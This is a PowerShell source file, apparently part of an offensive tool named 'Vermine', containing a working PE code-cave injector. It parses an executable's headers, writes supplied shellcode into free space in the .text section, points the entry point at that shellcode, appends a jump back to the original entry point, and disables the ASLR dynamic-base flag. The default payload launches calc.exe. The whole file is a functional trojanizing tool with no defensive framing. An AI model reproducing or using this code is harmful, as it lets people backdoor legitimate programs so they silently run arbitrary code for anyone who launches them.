class Vermine {
    # Methods | Injection
    static [void]InjectShc([string]$inPath, [string]$outPath, [byte[]]$shellcode, [string]$shellcodeBinPath, [bool]$verbose, [bool]$silent) {
        # Setup | Debug
        $dbgName = $MyInvocation.MyCommand.Name

        $verbose = $verbose -and !$silent

        # Setup | Shellcode
        if ($null -ne $shellcodeBinPath) {
            $shellcode = [System.IO.File]::ReadAllBytes($shellcodeBinPath)
        } elseif ($null -eq $shellcode) {
            Write-Console -do !$silent -name $dbgName -msg "Shellcode bytes nor bin path set!" -msgColor Red
            return
        }

        # Setup | File
        $bytes = [System.IO.File]::ReadAllBytes($inPath)

        Write-Console -do $verbose -name $dbgName -msg "Read all bytes from [$inPath]"
        
        # Setup | PE Header offsets
        $e_lfanew = [BitConverter]::ToUInt32($bytes, 0x3C)
        $sizeOfOptionalHeader = [BitConverter]::ToUInt16($bytes, $e_lfanew + 0x14)
        $sectionTableOffset = $e_lfanew + 0x18 + $sizeOfOptionalHeader

        $dbgHeaderOffsets = @"
        e_lfanew [$($e_lfanew.ToString("X8"))]
        | [uint16] Size of optional header: + 0x14: $($sizeOfOptionalHeader.ToString("X8")) 
        | Section table offset: + 0x18 + $($sizeOfOptionalHeader.ToString("X8")): $($sectionTableOffset.ToString("X8"))
"@

        Write-Console -do $verbose -msg "Setup PE header offsets:" -data $dbgHeaderOffsets

        # Setup | .text section
        $textHeaderOffset = $sectionTableOffset
        $textVSize = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x08)
        $textVAddr = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x0C)
        $textRawSize = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x10)
        $textRawAddr = [BitConverter]::ToUInt32($bytes, $textHeaderOffset + 0x14)

        $dbgText = @"
        .text [$($textHeaderOffset.ToString("X8"))]
        | Virtual Size: $($textVSize.ToString("X8"))
        | Virtual Address: $($textVAddr.ToString("X8"))
        | Raw Size: $($textRawSize.ToString("X8"))
        | Raw Address: $($textRawAddr.ToString("X8"))
"@

        Write-Console -do $verbose -msg "Assumed .text as first section of sectionTable" -data $dbgText

        # Append | Jump back to Original Entry Point (OEP)
        $imageBase = [BitConverter]::ToUInt64($bytes, $e_lfanew + 0x30)
        $oep = [BitConverter]::ToUInt32($bytes, $e_lfanew + 0x28)

        $absOEP = $imageBase + $oep

        $jumpBack = [byte[]] @(0x48, 0xB8) # mov rax, ...
        $jumpBack += [BitConverter]::GetBytes([uint64]$absOEP)
        $jumpBack += [byte[]] @(0xFF, 0xE0) # jmp rax

        $finalshc = $Shellcode + $jumpBack

        $dbgAbsOEP = @"
        Entry Point
        | [uint64] Image Base: e_lfanew + 0x30: $($imageBase.ToString("X8"))
        | [uint32] OEP: e_lfanew + 0x28: $($oep.ToString("X8"))
        | Absolute OEP: Image Base + OEP: $($absOEP.ToString("X8"))
"@

        Write-Console -do $verbose -msg "Calculated absolute OEP to jump back to. Appended simple 'jmp' instruction" -data $dbgAbsOEP

        # Disable DLL can move (Dynamic Base) in DLLCharacteristics to properly resolve absolute OEP (absOEP)
        $dllCharsOffset = $e_lfanew + 0x5E
        $cDllChars = [BitConverter]::ToUInt16($bytes, $dllCharsOffset)
        $nDllChars = $cDllChars -band -bnot 0x0040

        [BitConverter]::GetBytes([uint16]$nDllChars).CopyTo($bytes, $dllCharsOffset) # Replace

        $dbgCharsOffset = @"
        DLLCharacteristics [$($dllCharsOffset.ToString("X8"))]
        | [uint16] Old DLLChars: $cDllChars
        | New DLLChars: Old DLL Chars - 0x0040 (Dynamic Base flag): $nDllChars
"@

        Write-Console -do $verbose -msg "Updated DLLCharacteristics with DYNAMIC_BASE disabled. Allows proper resolve of absolute OEP" -data $dbgCharsOffset

        # Calc | Free bucket space to inject shellcode
        $injectionRawOffset = $textRawAddr + $textVSize
        $newEntryPointRVA = $textVAddr + $textVSize

        if (($textVSize + $finalshc.Length) -gt $textRawSize) {
            Write-Error "Not enough free space in .text codecave"
            return
        }

        Write-Console -do $verbose -msg "Calculated raw offset to insert shellcode at: .text rawAddr + .text vSize: $($injectionRawOffset.ToString("X8"))"
        Write-Console -do $verbose -msg "Calculated new entry point RVA: .text vAddr + .text vSize: $($newEntryPointRVA.ToString("X8"))"

        # Update | .text virtual size
        $newVSize = $textVSize + $finalshc.Length
        [BitConverter]::GetBytes([uint32]$newVSize).CopyTo($bytes, $textHeaderOffset + 0x08)

        Write-Console -do $verbose -msg "Updated .text virtual size with shellcode bytes: textVSize ($textVSize) + shellcodeLength ($($finalshc.Length)): $newVSize"

        # Update | Entry point RVA
        [BitConverter]::GetBytes([uint32]$newEntryPointRVA).CopyTo($bytes, $e_lfanew + 0x28)

        Write-Console -do $verbose -msg "Updated entry point RVA (e_lfanew + 0x28) with new entry point RVA: $($newEntryPointRVA.ToString("X8"))"

        # Write | Shellcode into the codecave
        [Array]::Copy($finalshc, 0, $bytes, $injectionRawOffset, $finalshc.Length)

        Write-Console -do $verbose -msg "Wrote final shellcode to bytes at raw injection offset: $($injectionRawOffset.ToString("X8"))"

        # --- 6. Save File ---
        [System.IO.File]::WriteAllBytes($outPath, $bytes)
        Write-Console -do (-not $silent) -name "/$dbgName" -msg "Wrote modified PE bytes to output file [$outPath]"
    }

    static [void]InjectShc([string]$inPath, [string]$outPath, [byte[]]$shellcode) {
        [Vermine]::InjectShc($inPath, $outPath, $shellcode, $null, $false, $false)
    }

    static [void]InjectShc([string]$inPath, [string]$outPath, [string]$shellcodeBinPath) {
        [Vermine]::InjectShc($inPath, $outPath, $null, $shellcodeBinPath, $false, $false)
    }

    static [void]InjectShc([string]$inPath, [string]$outPath) {
        [Vermine]::InjectShc($inPath, $outPath, (New-RunShellcode -call "calc.exe"), $null, $false, $false)
    }
}